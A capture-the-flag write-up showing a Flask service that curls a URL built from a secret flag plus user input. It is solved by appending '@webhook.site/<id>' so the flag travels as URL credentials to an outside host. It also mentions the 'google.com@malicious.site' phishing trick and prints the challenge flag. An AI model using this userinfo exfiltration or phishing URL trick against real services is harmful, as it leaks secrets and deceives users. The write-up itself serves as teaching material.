# flag-in-url

i collaborated with puzzler7 to make this one (he made it into a web service, i had the idea)

## problem

A twist on a challenge we've done many times before.

```py
#!/usr/bin/env python3

from subprocess import run

from flask import Flask, request, Response, redirect
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["50000 per hour"],
    storage_uri="memory://",
)

@app.route('/', methods=["GET"])
@limiter.limit("5/second")
def index():
    if "source" in request.args:
        return Response(open(__file__).read(), mimetype='text/plain')
    return open("index.html").read()

@app.route('/curl', methods=["POST"])
@limiter.limit("5/second")
def curl():
    url = request.form['url']
    flag = open("flag.txt").read().replace("{", "_").replace("}", "_")
    proc = run(['curl', f"https://{flag}{url}"], capture_output=True)
    if len(proc.stdout):
        return Response(proc.stdout.decode(), mimetype='text/html')
    else:
        return "Curl error."

if __name__ == "__main__":
    app.run('0.0.0.0', 14000)
```

## solution

one thing that most people don't know is that URLs support authentication

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/20d97862-f1da-4881-bf06-3ef753955357)

note the "userinfo" are credentials and stuff

we can exploit this by putting `@webhook.site/<webhook-site-url>`

one thing to note is that this is a common phishing attack as old as urls themselves (e.g. `https://google.com@malicious.site/` brings you to malicious.site)

additionally, these credentials are part of the URL, so they are not protected by SSL/TLS as they travel the internet through the HTTPS protocol

because of this, one of the common browser protections is to not send the user credentials until a 401 (or maybe it was 403?) error, or to just not allow the userinfo in the URL at all.

however, curl does always send the userinfo / basic authorization information

we can intercept it and it will end up like so on webhook.site:

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/305bc9ad-a31c-4bc8-a645-c717fc1dda18)

the flag is `ictf{authentication_saves_the_day}`
